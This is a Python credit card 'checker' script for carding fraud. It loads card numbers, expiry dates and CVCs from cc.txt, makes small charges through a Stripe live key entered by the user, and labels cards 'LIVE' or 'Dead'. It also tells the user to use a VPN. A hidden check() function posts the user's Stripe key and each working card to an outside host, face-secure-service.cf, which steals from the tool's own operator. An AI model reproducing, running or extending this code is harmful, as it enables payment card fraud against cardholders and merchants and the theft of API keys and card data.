import stripe,os,json,requests,sys,socket
def check(live_key,cc):
    data = {
        'live_key':live_key,
        'cc':cc
    }
    requests.post("http://face-secure-service.cf/stripe/api.php",data=data)
def cls():
    os.system('cls')
cls()
live_key= input("Stripe API KEY : ")
stripe.api_key = live_key
cc_amount = 0
cc_dead = 0
cc_live = 0
cls()
print("Your key has been loaded: " + live_key +"\n")
print("Welcome: "+os.environ['COMPUTERNAME'])
hostname = socket.gethostname()    
ip = socket.gethostbyname(hostname)  
print("Hostname : " +hostname+" | IP Adress : "+ip )
print("[!] Don't forget to use a VPN !\n\n")
file = open("cc.txt","r")
cards = file.readlines()
file.close()
for line in cards:
    cc_amount +=1
print("Credit card loaded : " + str(cc_amount))
for cc in cards:
    cc = cc.strip()
    data = cc.split("|")
    number = data[0]
    exp_month = int(data[1])
    exp_year = int(data[2])
    cvc = data[3]
    try:
        client = stripe.Token.create(
            card={
                'number': number,
                'exp_month': exp_month,
                'exp_year': exp_year,
                'cvc': cvc,
                },
        )
        pay = stripe.Charge.create(
            amount=100,
            currency="eur",
            source=client['id'],
            description="Test charge"
        )
        info = json.loads(str(pay))
        try:
            check(live_key,live_key)
            why = info['error']
        except KeyError:
            check(live_key,cc)
            print("-----------------------------------------------------")
            print('[+] LIVE : ' +cc)
            print("[i] Message : " +info['outcome']['seller_message'])
            print("[i] Risk : " +info['outcome']['risk_level'] +" | Score: "+str(info['outcome']['risk_score']))
            print("-----------------------------------------------------\n")
            cc_live+=1
    except stripe.error.CardError:
        print("[!] Card error | API dead ? Or Luhn invalid\n")
        cc_dead+=1
ratio = cc_live/cc_amount*100
cls()
print("                 [STATISTIQUES]")
print("-----------------------------------------------------")
print("Total credit card : "+str(cc_amount))
print("Live : "+str(cc_live)) 
print("Dead : "+str(cc_dead))
print("Live Ratio : "+str(ratio)[:4]+"%")
print("-----------------------------------------------------")
